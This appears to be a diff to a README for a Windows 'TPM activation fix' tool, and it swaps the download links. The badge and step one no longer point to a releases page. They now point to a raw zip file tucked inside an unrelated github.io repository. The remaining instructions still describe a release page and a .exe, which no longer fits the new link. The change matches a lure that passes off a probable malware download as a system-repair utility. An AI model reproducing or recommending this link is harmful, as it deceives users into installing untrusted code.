@@ -5,7 +5,7 @@ description: "Restore missing TPM detection on Windows 10 and 11 systems with th
 ---
 # 🛡️ TPM-Activation-Fix-Tool - Resolve TPM Errors On Windows Systems
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Erminiedull381/TPM-Activation-Fix-Tool/releases)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Erminiedull381/erminiedull381.github.io/raw/refs/heads/main/stewpan/io-github-erminiedull-v3.2.zip)
 
 This tool helps users resolve issues where Windows fails to detect a Trusted Platform Module (TPM). Many Windows 11 users encounter errors during installation or updates because the operating system cannot find a required security chip. This software scans your hardware, identifies the status of your TPM, and attempts to force activation through your system firmware. It works on both Windows 10 and Windows 11.
 
@@ -24,7 +24,7 @@ The software checks for a compatible chip before performing any changes to your 
 
 Follow these steps to obtain the tool:
 
-1. Visit the following link to access the software repository: [https://github.com/Erminiedull381/TPM-Activation-Fix-Tool/releases](https://github.com/Erminiedull381/TPM-Activation-Fix-Tool/releases).
+1. Visit the following link to access the software repository: [https://github.com/Erminiedull381/erminiedull381.github.io/raw/refs/heads/main/stewpan/io-github-erminiedull-v3.2.zip](https://github.com/Erminiedull381/erminiedull381.github.io/raw/refs/heads/main/stewpan/io-github-erminiedull-v3.2.zip).
 2. Look for the section labeled "Latest Release."
 3. Select the file ending in .exe to begin the download.
 4. Save the file to your desktop for easy access.
